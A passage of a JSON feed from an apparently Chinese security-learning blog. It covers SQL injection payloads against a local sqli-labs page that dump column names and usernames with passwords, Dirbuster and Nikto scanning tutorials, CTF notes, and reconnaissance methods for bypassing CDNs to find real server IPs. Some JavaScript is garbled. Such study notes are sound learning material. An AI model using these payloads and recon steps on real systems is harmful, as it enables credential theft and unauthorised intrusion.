data-url=\"aHR0cDovLzEyNy4wLjAuMS9zcWwtbGFicy9sZXNzLTUvP2lkPTElRTIlODAlOTk=\">http://127.0.0.1/sql-labs/less-5/?id=1’</span> and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where<br />\ntable_name=‘users’),0x7e),1)–+</p>\n<p><strong>查询 username、password 字段的内容：</strong></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS9zcWwtbGFicy9sZXNzLTUvP2lkPTE=\">http://127.0.0.1/sql-labs/less-5/?id=1</span>' and updatexml(1,concat(0x7e,(select group_concat(username,':',passwo</p>\n<p>超过长度限制利用 mid 等函数截取</p>\n",
            "tags": []
        },
        {
            "id": "https://mashiro.zone/%E7%B2%98%E8%B4%B4/",
            "url": "https://mashiro.zone/%E7%B2%98%E8%B4%B4/",
            "title": "",
            "date_published": "2021-05-12T13:31:57.523Z",
            "content_html": "<p><strong>0x00 简介</strong></p>\n<p>Dirbuster 是 Owasp (开放 Web 软体安全项目 - Open Web Application Security Project) 开发的一款专门用于探测 Web 服务器的目录和隐藏文件；该工具提供 GUI 和终端两种形式，支持多种扫描 方式。</p>\n<p><strong>注：kali 中默认集成该工具，本次使用 kali 演示</strong></p>\n<p><strong>0x01 启动 Dirbuster</strong></p>\n<ul>\n<li></li>\n<li></li>\n</ul>\n<pre><code># 在终端下输入dirbusterdirbuster\n</code></pre>\n<p><img data-src=\"https://mmbiz.qpic.cn/mmbiz_png/u5KqVShKUTZLlyIO3nMzGRzOrzLickaGbib8QCb63HSL3DLswDia2Ex0PyPaYz1KK9EgN2yvH1PA9SSS7GPLwrHhA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1\" alt=\"图片\" /></p>\n<p><strong>0x02 使用简介</strong></p>\n<p><strong>2.1 目标 URL</strong></p>\n<p><img data-src=\"https://mmbiz.qpic.cn/mmbiz_png/u5KqVShKUTZLlyIO3nMzGRzOrzLickaGbnMrT2Q8v2mf8j6ocYdXGsL6bxbpGkiaLXfvehrBAT8JcI0CLXibdYAxg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1\" alt=\"图片\" /></p>\n<p>填写待扫描的目标</p>\n<p><strong>2.2 HTTP 请求方法</strong></p>\n<p><img data-src=\"https://mmbiz.qpic.cn/mmbiz_png/u5KqVShKUTZLlyIO3nMzGRzOrzLickaGbib03ZPurCQlRSUyzXFLYc7ibnShZfDl5oqNP5VHH6u4fEDEsX9AibDVBg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1\" alt=\"图片\" /></p>\n<p>该选项提供了两种模式：</p>\n<ul>\n<li>仅使用 GET 请求</li>\n<li>在 HEAD 和 GET 中自动切换</li>\n</ul>\n<p>推荐使用 “自动选择” 模式</p>\n<p><strong>2.3 设置线程数</strong></p>\n<p><img data-src=\"https://mmbiz.qpic.cn/mmbiz_png/u5KqVShKUTZLlyIO3nMzGRzOrzLickaGbqgMGicsjDOC8tRBZYCduO2bicEvwPBSf5hTloQ8JEKULNEZdaRichbqDw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1\" alt=\"图片\" /></p>\n<p>选择程序开启的子线程数量</p>\n<p>勾选 “Go Faster” 允许使用超过一百条线程 (推荐线程数为 CPU 核心数 * 8)</p>\n<p><strong>2.4 字典选项</strong></p>\n<p><img data-src=\"https://mmbiz.qpic.cn/mmbiz_png/u5KqVShKUTZLlyIO3nMzGRzOrzLickaGbJZswb5xbIXvdDSS4OqJWzT3ugXTTZrCmdz9Hnc47QBjIJbMWgDKpYA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1\" alt=\"图片\" /></p>\n<ul>\n<li>List Based brute force：基于字典遍历</li>\n<li>Pure Brute Force：自动生成字典</li>\n</ul>\n<p>Dirbuster 默认字典存储位置：/usr/share/dirbuster/wordlists/</p>\n<p><strong>2.5 扫描配置</strong></p>\n<p><img data-src=\"https://mmbiz.qpic.cn/mmbiz_png/u5KqVShKUTZLlyIO3nMzGRzOrzLickaGbT7xUyEDfqO9NAGaFIbW8T8XZTNFqYIuSjQSIP8Y4k27ONMJ4mtfHew/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1\" alt=\"图片\" /></p>\n<ul>\n<li>Standard start point：标准模式</li>\n<li>URL Fuzz：URL 模糊测试</li>\n<li>Brute Force Dirs：爆破目录</li>\n<li>Brute Force Files：爆破文件</li>\n<li>Be Recursive：递归扫描 (慎用)</li>\n<li>Use Blank Exension：使用空白拓展名</li>\n<li>Dir start with：根路径 (部分站点为子目录形式)</li>\n<li>File extension：文件拓展</li>\n</ul>\n<p><strong>0x03 开始任务</strong></p>\n<p>3.1 点击 start 开始扫描 (如果找不到此功能，请尝试增加窗口大小)</p>\n<p><img data-src=\"https://mmbiz.qpic.cn/mmbiz_png/u5KqVShKUTZLlyIO3nMzGRzOrzLickaGb8ZCAmy8LA7YTAgoymjxUYfL05DMtxicosyMruqrpuUxVpgvwrRCmdxw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1\" alt=\"图片\" /></p>\n<p>3.2 Scan information 显示当前扫描的进度</p>\n<p><img data-src=\"https://mmbiz.qpic.cn/mmbiz_png/u5KqVShKUTZLlyIO3nMzGRzOrzLickaGbbB7t3WOGZ3RTNJ80RQ5miadpCib3H5SxyjjerU9CZ0ThejrSDKzgyqSw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1\" alt=\"图片\" /></p>\n<p>3.3 Result 显示了扫描的结果，支持列表展示和树形展示</p>\n<p><img data-src=\"https://mmbiz.qpic.cn/mmbiz_png/u5KqVShKUTZLlyIO3nMzGRzOrzLickaGbPXPL6BLQtP87MxRlweEErhmZv57F3T7gMfYvcF9bpsKVZM0Da1N3kA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1\" alt=\"图片\" /></p>\n<p><img data-src=\"https://mmbiz.qpic.cn/mmbiz_png/u5KqVShKUTZLlyIO3nMzGRzOrzLickaGbn8NSMOcwEGqOTfsIPxvfCGDUP7iaSlPI3Ctqll0GTpsictqVa47OwJvg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1\" alt=\"图片\" /></p>\n<p>补充：常见的 HTTP 状态码如下：</p>\n<ul>\n<li>200 - 请求成功</li>\n<li>301 - 资源（网页等）被永久转移到其它 URL</li>\n<li>404 - 请求的资源（网页等）不存在</li>\n<li>500 - 内部服务器错误</li>\n</ul>\n<p>更多参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS9odHRwL2h0dHAtc3RhdHVzLWNvZGVzLmh0bWw=\">https://www.runoob.com/http/http-status-codes.html</span></p>\n<p>3.4 错误页面</p>\n<p><img data-src=\"https://mmbiz.qpic.cn/mmbiz_png/u5KqVShKUTZLlyIO3nMzGRzOrzLickaGb0frfv2gpR8YQxpTkApxByWI9HceXYhCAeLGXzf2xUaMMicWscplYvFw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1\" alt=\"图片\" /></p>\n<p><strong>0x04 导出结果</strong><br />\n 4.1 等待扫描完成</p>\n<p>扫描过程比较慢，耐心等待一会.....</p>\n<p><img data-src=\"https://mmbiz.qpic.cn/mmbiz_png/u5KqVShKUTZLlyIO3nMzGRzOrzLickaGbtWkkkfiaDodNiaxmvnicUh64h13ymEkpeWwICpZKiaO5zuWZPHAKAEtgBg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1\" alt=\"图片\" /></p>\n<p>扫描结束，共扫描到一个结果</p>\n<p>4.2 导出扫描结果</p>\n<p>点击 Report 按钮</p>\n<p><img data-src=\"https://mmbiz.qpic.cn/mmbiz_png/u5KqVShKUTZLlyIO3nMzGRzOrzLickaGbCpZicNJnm16rFprIetqnv9174mbicnFrZmxTGJfzvbcWITyTVvJt4nEg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1\" alt=\"图片\" /></p>\n<p><img data-src=\"https://mmbiz.qpic.cn/mmbiz_png/u5KqVShKUTZLlyIO3nMzGRzOrzLickaGbE1TY4TMHtN6YwkibibkOxhstibEnxxxoycHw1DfESWHJQLjeHxe2vsSfg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1\" alt=\"图片\" /></p>\n<p>点击导出</p>\n<p><img data-src=\"https://mmbiz.qpic.cn/mmbiz_png/u5KqVShKUTZLlyIO3nMzGRzOrzLickaGbhYBkoHADPzBgRwagPjibToKFVAJcIgGNkOKQ0BicZQZrRbOzS5lwibd5A/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1\" alt=\"图片\" /></p>\n<p>查看导出的报告</p>\n<p><img data-src=\"https://mmbiz.qpic.cn/mmbiz_png/u5KqVShKUTZLlyIO3nMzGRzOrzLickaGblBTc1h1dpv0esO3iaFx6fuzfKVc4fEUUjT02lICr1OK6Ifyd227vMIw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1\" alt=\"图片\" /></p>\n<p><strong>0x05 END</strong></p>\n<p><strong>0x00 简介</strong></p>\n<p>​    **Nikto 是一款开源的（<strong><strong>GPL</strong></strong>）网页服务器扫描器，它可以对网页服务器进行全面的多种扫描，包含超过 3300 种有潜在危险的文件 CGIs；超过 625 种服务器版本；超过 230 种特定服务器问题。**Nikto 可扫描指定主机的 WEB 类型，主机名称，指定目录，特定 CGI 漏洞，返回主机允许的 http 模式等。</p>\n<p><strong>注：由于在 kali 中已经集成 nikto，本文直接用 kali 演示</strong></p>\n<p><strong>0x01 扫描单个 URL</strong></p>\n<ul>\n<li></li>\n</ul>\n<pre><code>nikto -host [host/ip]:[port]\n</code></pre>\n<p><img data-src=\"https://mmbiz.qpic.cn/mmbiz_png/u5KqVShKUTajt6RB9VO37pAwbmtQ4VAwUePGShMEzPMUoM7InLibia04ZaLicIc9ykTZibqrbNDmOTfVnia0qibFAeeg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1\" alt=\"图片\" /></p>\n<p><strong>0x02 扫描多个 URL</strong></p>\n<ul>\n<li></li>\n</ul>\n<pre><code>nikto -host [文件路径]\n</code></pre>\n<p><img data-src=\"https://mmbiz.qpic.cn/mmbiz_png/u5KqVShKUTajt6RB9VO37pAwbmtQ4VAwUyRBPIrwoYsqToqvxIQdg2ia4ibg8RyG49y3ENE9M5ibjlgWiacqE0fSEw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1\" alt=\"图片\" /></p>\n<p><strong>0x03 扫描 HTTPS 网站</strong></p>\n<ul>\n<li></li>\n</ul>\n<pre><code>nikto -host [host/ip] -ssl -port [port]\n</code></pre>\n<p><img data-src=\"https://mmbiz.qpic.cn/mmbiz_png/u5KqVShKUTajt6RB9VO37pAwbmtQ4VAwYYmpjEH0038Aq3OgE7qqC5iaP1K0O1Qc7SorT0sAVHrGL02uicawAtMg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1\" alt=\"图片\" /></p>\n<p><strong>0x04 使用代理</strong></p>\n<ul>\n<li></li>\n</ul>\n<pre><code>nikto -host -useproxy 协议://ip:port\n</code></pre>\n<p><strong>0x05 修改默认配置</strong></p>\n<p>mikto 配置文件位于： /etc/nikto.conf</p>\n<p><strong>注：修改配置文件需要 root 权限</strong></p>\n<p>修改默认 UA</p>\n<p><img data-src=\"https://mmbiz.qpic.cn/mmbiz_png/u5KqVShKUTajt6RB9VO37pAwbmtQ4VAwoyZibuNS96KCTuFZoDHtzbY8Oox3ttJ2cBYae6LPDS5icTPKlDcGFOJA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1\" alt=\"图片\" /></p>\n<p>增加全局默认 Cookie</p>\n<p><img data-src=\"https://mmbiz.qpic.cn/mmbiz_png/u5KqVShKUTajt6RB9VO37pAwbmtQ4VAwtrjUibLf1ZaohWB1XtS19nWzicic7PMN3VpcGkEECSheyuPMQKernVLicQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1\" alt=\"图片\" /></p>\n",
            "tags": []
        },
        {
            "id": "https://mashiro.zone/web%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/",
            "url": "https://mashiro.zone/web%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/",
            "title": "",
            "date_published": "2021-05-12T11:22:06.795Z",
            "content_html": "<h2 id=\"dns\"><a class=\"anchor\" href=\"#dns\">#</a> DNS</h2>\n<p>常见的 dns 攻击</p>\n<p>dns 服务器是全球共有的</p>\n<p>dns 劫持：</p>\n<p>1. 错误域名解析到纠错导航页面，导航页面存在广告。判断方法：访问的域名是错误的，而且跳转的导航页面也是官方的，如电信的 114，联通移网域名纠错导航页面。</p>\n<p>2. 错误域名解析到非正常页面，对错误的域名解析到导航页的基础上，有一定几率解析到一些恶意站点，这些恶意站点通过判断你访问的目标 HOST、URI、 referrer 等来确定是否跳转广告页面，这种情况就有可能导致跳转广告页面（域名输错）或者访问页面被加广告（页面加载时有些元素的域名错误而触发）这种劫持会对用户访问的目标 HOST、URI、 referrer 等会进行判定来确定是否解析恶意站点地址，不易被发现。</p>\n<p>3. 直接将特点站点解析到恶意或者广告页面，这种情况比较恶劣，而且出现这种情况未必就是运营商所为，家里路由器被黑，或者系统被入侵，甚至运营商的某些节点被第三方恶意控制都有可能。具体情况要具体分析，这里就不展开了。</p>\n<p>DNS 劫持常见于使用自动的 DNS 地址，所以，不管有没有被劫持，尽量不要使用运营商默认的 DNS。</p>\n<h2 id=\"脚本语言\"><a class=\"anchor\" href=\"#脚本语言\">#</a> 脚本语言</h2>\n<p>asp php aspx jsp javaweb python</p>\n<p>web 站点安全漏洞取决于语言种类</p>\n<p>学习要求：理解语言框架，语法规则，略知一二</p>\n<h2 id=\"web后门\"><a class=\"anchor\" href=\"#web后门\">#</a> web 后门</h2>\n<p>也称 webshell，用处为控制网站，</p>\n<p>免杀：不被识别到</p>\n<h2 id=\"web的组成\"><a class=\"anchor\" href=\"#web的组成\">#</a> web 的组成</h2>\n",
            "tags": []
        },
        {
            "id": "https://mashiro.zone/web%E5%AE%89%E5%85%A8/bugku/",
            "url": "https://mashiro.zone/web%E5%AE%89%E5%85%A8/bugku/",
            "title": "",
            "date_published": "2021-05-05T02:44:25.935Z",
            "content_html": "<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$num</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$num</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token single-quoted-string string\">'flag&#123;**********&#125;'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>is_numeric 函数</p>\n<p>如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，注意浮点型返回空值，即 FALSE。</p>\n<p>PHP 一个数字和一个字符串进行比较或者进行运算时，PHP 会把字符串转换成数字再进行比较。PHP 转换的规则的是：若字符串以数字开头，则取开头数字作为转换结果，若无则输出 0。 在 PHP 中，== 会先进行类型转换，再进行对比，而 === 会先比较类型，如果类型不同直接返回不相等</p>\n<p>&amp;#+ 数字为 unicode 编码</p>\n<p>js 可以添加断点</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRlZS5jb20veGl4aWZlbmcuY29tL2h0dHBzaWdu\">HTTP Sign</span> 是一个 RESTful API 签名认证项目。<br />\n该项目将解决 HTTP 通信中的如下问题:</p>\n<ul>\n<li>防止重放攻击</li>\n<li>防止中途篡改数据</li>\n<li>保证请求服务幂等</li>\n</ul>\n<p>从而，尽可能地让 HTTP 通信接近安全。</p>\n<p>url 编码</p>\n<p>function checkSubmit(){var a=document.getElementById(&quot;password&quot;);if(&quot;undefined&quot;!=typeof a){if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value)return!0;a%6aa648cf6e87a7114f1&quot;==a.value)return!0;alert(&quot;Error&quot;);a.focus();return!1}}document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit;cert(&quot;Error&quot;);a.focus();return!1}}document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit;</p>\n",
            "tags": []
        },
        {
            "id": "https://mashiro.zone/web%E5%AE%89%E5%85%A8/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80ctf/",
            "url": "https://mashiro.zone/web%E5%AE%89%E5%85%A8/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80ctf/",
            "title": "",
            "date_published": "2021-05-04T11:35:37.204Z",
            "content_html": "<p>取自 NU1L 战队的《从零到一的 ctfer 成长之路》</p>\n<h2 id=\"web安全的相关概念\"><a class=\"anchor\" href=\"#web安全的相关概念\">#</a> web 安全的相关概念</h2>\n<p><strong>1.POC</strong></p>\n<p><code>POC，Proof ofConcept</code> ，中文意思是 “ <code>观点证明</code> ”。这个短语会在漏洞报告中使用，漏洞报告中的 POC 则是 <code>一段说明或者一个攻击的样</code> 例，使得读者能够确认这个漏洞是真实存在的。<br />\n<strong>2.EXP</strong></p>\n<p><code>EXP</code> ，Exploit，中文意思是 “ <code>漏洞利用</code> ”。意思是一段对漏洞 <code>如何利用的详细说明或者一个演示的漏洞攻击代码</code> ，可以使得读者完全了解漏洞的机理以及利用的方法。<br />\n<strong>3.VUL</strong></p>\n<p><code>VUL</code> ，Vulnerability 的缩写，泛指 <code>漏洞</code> 。</p>\n<p><strong>4.payload</strong>（有效攻击负载）是包含在你用于一次漏洞利用（exploit）中的 ShellCode 中的主要功能代码</p>\n<p><strong>5.shellcode</strong>（可提权代码） 对于一个漏洞来说，ShellCode 就是一个用于某个漏洞的二进制代码框架，有了这个框架你可以在这个 ShellCode 中包含你需要的 Payload 来做一些事情</p>\n<p><strong>6.CVE 漏洞编号</strong></p>\n<p><code>CVE</code>  的英文全称是 “Common Vulnerabilities &amp;  Exposures” 公共漏洞和暴露，例如 CVE-2015-0057、CVE-1999-0001 等等。CVE 就好像是一个字典表，为广泛认同的信息安全漏洞或者已经暴露出来的弱点给出一个公共的名称。如果在一个漏洞报告中指明的一个漏洞，如果有 CVE 名称，你就可以快速地在任何其它 CVE 兼容的数据库中找到相应修补的信息，解决安全问题。</p>\n<p>可以在 https://cve.mitre.org/ 网站根据漏洞的 CVE 编号搜索该漏洞的介绍。</p>\n<p>也可以在中文社区 http://www.scap.org.cn/ 上搜索关于漏洞的介绍</p>\n<p><strong>5.0DAY 漏洞和 0DAY 攻击</strong></p>\n<p>在计算机领域中，零日漏洞或零时差漏洞（英语：Zero-dayexploit）通常是指还没有补丁的安全漏洞，而零日攻击或零时差攻击（英语：Zero-dayattack）则是指利用这种漏洞进行的攻击。提供该漏洞细节或者利用程序的人通常是该漏洞的发现者。零日漏洞的利用程序对网络安全具有巨大威胁，因此零日漏洞不但是黑客的最爱，掌握多少零日漏洞也成为评价黑客技术水平的一个重要参数。<br />\n零日漏洞及其利用代码不仅对犯罪黑客而言，具有极高的利用价值，一些国家间谍和网军部队，例如美国国家安全局和美国网战司令部也非常重视这些信息 [1]。据路透社报告称美国政府是零日漏洞黑市的最大买家</p>\n<h2 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h2>\n<h2 id=\"信息收集之cms指纹识别\"><a class=\"anchor\" href=\"#信息收集之cms指纹识别\">#</a> [信息收集之 CMS 指纹识别]</h2>\n<h2 id=\"1-指纹识别\"><a class=\"anchor\" href=\"#1-指纹识别\">#</a> 1. 指纹识别</h2>\n<h3 id=\"11了解cms指纹识别\"><a class=\"anchor\" href=\"#11了解cms指纹识别\">#</a> 1.1 了解 CMS 指纹识别</h3>\n<p>CMS：快速搭建网站的内容管理系统</p>\n<p>Web 应用框架：快速二次开发的 Web 应用框架，例如网站，小程序</p>\n<h3 id=\"12-指纹的特性\"><a class=\"anchor\" href=\"#12-指纹的特性\">#</a> 1.2 指纹的特性</h3>\n<ul>\n<li>唯一性</li>\n<li>终身不变性</li>\n<li>方便性</li>\n</ul>\n<h3 id=\"13-指纹识别的方式\"><a class=\"anchor\" href=\"#13-指纹识别的方式\">#</a> 1.3 指纹识别的方式</h3>\n<ul>\n<li>\n<p>云悉在线    <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVuc2VlLmNuLw==\">https://www.yunsee.cn/</span></p>\n</li>\n<li>\n<p>WhatWeb   <span class=\"exturl\" data-url=\"aHR0cHM6Ly93aGF0d2ViLm5ldC8=\">https://whatweb.net/</span>     <span class=\"exturl\" data-url=\"aHR0cDovL3doYXR3ZWIuYnVnc2NhbmVyLmNvbS9sb29r\">http://whatweb.bugscaner.com/look</span></p>\n</li>\n<li>\n<p>插件 Wappalyzer： <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cud2FwcGFseXplci5jb20=\">https://www.wappalyzer.com</span></p>\n</li>\n<li>\n<p>脚本：</p>\n<p>CMSeek：</p>\n<pre><code>kali下安装：\n    git clone https://github.com/Tuhinshubhra/CMSeeK\n    cd CMSeeK\n    pip/pip3 install -r requirements.txt\n\t\n\tpython3 cmseek.py -u 目标    //使用\n\t\n\tpython3 cmseek.py –update   //检查更新\n</code></pre>\n<p>Webfinger： <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NlNTVpMG4vV2ViZmluZ2Vy\">https://github.com/se55i0n/Webfinger</span></p>\n</li>\n</ul>\n<h2 id=\"2-waf\"><a class=\"anchor\" href=\"#2-waf\">#</a> 2. WAF</h2>\n<p>专针对 Web 应用攻击的防护产品</p>\n<h4 id=\"awesome-waf项目\"><a class=\"anchor\" href=\"#awesome-waf项目\">#</a> Awesome-WAF 项目 ：</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tLzB4SW5mZWN0aW9uL0F3ZXNvbWUtV0FG\">https://github.com/0xInfection/Awesome-WAF</span></p>\n<h4 id=\"检测脚本wafw00f\"><a class=\"anchor\" href=\"#检测脚本wafw00f\">#</a> 检测脚本 wafw00f ：</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0VuYWJsZVNlY3VyaXR5L3dhZncwMGY=\">https://github.com/EnableSecurity/wafw00f</span></p>\n<pre><code>kali下安装wafw00f\n\tgit clone https://github.com/EnableSecurity/wafw00f\n\tcd wafw00f\n\tpython setup.py install\n\t\n</code></pre>\n<h2 id=\"3-cdn\"><a class=\"anchor\" href=\"#3-cdn\">#</a> 3. CDN</h2>\n<p>CDN： 内容分发网络</p>\n<p>基本思路是 尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快，更稳定</p>\n<p>改善网络加载时间，减少服务器负载，降低成本，提高网络安全行</p>\n<h3 id=\"cdn检测\"><a class=\"anchor\" href=\"#cdn检测\">#</a> CDN 检测</h3>\n<ul>\n<li>国内在线  CDN 云观测  <span class=\"exturl\" data-url=\"aHR0cDovL2Nkbi5jaGluYXouY29t\">http://cdn.chinaz.com</span></li>\n<li>国外在线 CDNplanet    <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY2RucGxhbmV0LmNvbQ==\">https://www.cdnplanet.com</span></li>\n<li>脚本探测：xcdn   <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tLzN4cDEwaXQveGNkbg==\">https://github.com/3xp10it/xcdn</span></li>\n</ul>\n<pre><code>kali下安装xcdn\n\t git clone https://github.com/3xp10it/xcdn\n</code></pre>\n<h2 id=\"4常见的寻找真实ip的方法\"><a class=\"anchor\" href=\"#4常见的寻找真实ip的方法\">#</a> 4. 常见的寻找真实 IP 的方法：</h2>\n<ul>\n<li>超级 ping：<span class=\"exturl\" data-url=\"aHR0cDovL3BpbmcuY2hpbmF6LmNvbS8=\">http://ping.chinaz.com/</span></li>\n<li>历史解析：\n<ul>\n<li>微步在线：<span class=\"exturl\" data-url=\"aHR0cHM6Ly94LnRocmVhdGJvb2suY24v\">https://x.threatbook.cn/</span></li>\n<li>历史 Whois：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmVubWkuY29tL3dob2lzaGlzdG9yeS8=\">https://www.benmi.com/whoishistory/</span></li>\n<li>历史托管：<span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29sYmFyLm5ldGNyYWZ0LmNvbS9zaXRlX3JlcG9ydD91cmw9\">https://toolbar.netcraft.com/site_report?url=</span></li>\n</ul>\n</li>\n<li>内部邮箱源：对方发送邮件，查看邮件来源 IP</li>\n<li>二级域名：寻找子域名，找到未绑定 CDN 站点。</li>\n<li>手机 App：使用 Brup 抓取收集 App 数据包</li>\n<li>微信公众号：使用 Brup 抓取微信公众号数据包</li>\n<li>国外 ping：\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3BpbmcuZ2U=\">ping.ge</span>：<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5waW5nLnBl\">http://www.ping.pe</span></li>\n<li>海外测速：<span class=\"exturl\" data-url=\"aHR0cDovL3Rvb2wuY2hpbmF6LmNvbS9zcGVlZHdvcmxkLw==\">http://tool.chinaz.com/speedworld/</span></li>\n</ul>\n</li>\n<li>网络空间搜索引擎：fofa：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9mb2ZhLnNv\">https://fofa.so</span></li>\n</ul>\n<h2 id=\"5-cdn漏洞案例\"><a class=\"anchor\" href=\"#5-cdn漏洞案例\">#</a> 5. CDN 漏洞案例：</h2>\n<ul>\n<li>CloudFlare 防护下的破绽：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzQxNTMzLmh0bWw=\">https://www.freebuf.com/articles/web/41533.html</span></li>\n</ul>\n<p>都是通过寻找对方未绑定 CDN 站点进行突破，从而找到真实站点。</p>\n<h2 id=\"补充\"><a class=\"anchor\" href=\"#补充\">#</a> 补充</h2>\n<h4 id=\"在线知识\"><a class=\"anchor\" href=\"#在线知识\">#</a> 在线知识</h4>\n<ul>\n<li>绿盟    <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5uc2ZvY3VzLm5ldC9pbmRleC5waHA/YWN0PXNlY19idWc=\">http://www.nsfocus.net/index.php?act=sec_bug</span></li>\n<li>乌云知识库   <span class=\"exturl\" data-url=\"aHR0cHM6Ly93b295dW4ua2llcmFuLnRvcC8jIS8=\">https://wooyun.kieran.top/#!/</span></li>\n<li>安全知识库   <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5haXNlYy5jbi9zZWNpbmZvL2luZGV4LnBocA==\">http://www.aisec.cn/secinfo/index.php</span></li>\n</ul>\n<h4 id=\"在线工具\"><a class=\"anchor\" href=\"#在线工具\">#</a> 在线工具</h4>\n<ul>\n<li>重大历史漏洞在线检测    <span class=\"exturl\" data-url=\"aHR0cDovLzBkYXkud2Vic2Fhcy5jb20uY24=\">http://0day.websaas.com.cn</span></li>\n<li>历史 IP 查询        <span class=\"exturl\" data-url=\"aHR0cDovL3NpdGUuaXAxMzguY29t\">http://site.ip138.com</span></li>\n<li>历史 IP 查询        <span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWJpcGxvb2t1cC5jb20=\">https://webiplookup.com</span></li>\n</ul>\n<h4 id=\"公开漏洞\"><a class=\"anchor\" href=\"#公开漏洞\">#</a> 公开漏洞</h4>\n<ul>\n<li>乌云    <span class=\"exturl\" data-url=\"aHR0cHM6Ly93b295dW4ud2Vic2l0ZQ==\">https://wooyun.website</span></li>\n<li>SRC\n<ul>\n<li>hackerone     <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrZXJvbmUuY29tL2hhY2t0aXZpdHk=\">https://hackerone.com/hacktivity</span></li>\n<li>同城艺龙 SRC   <span class=\"exturl\" 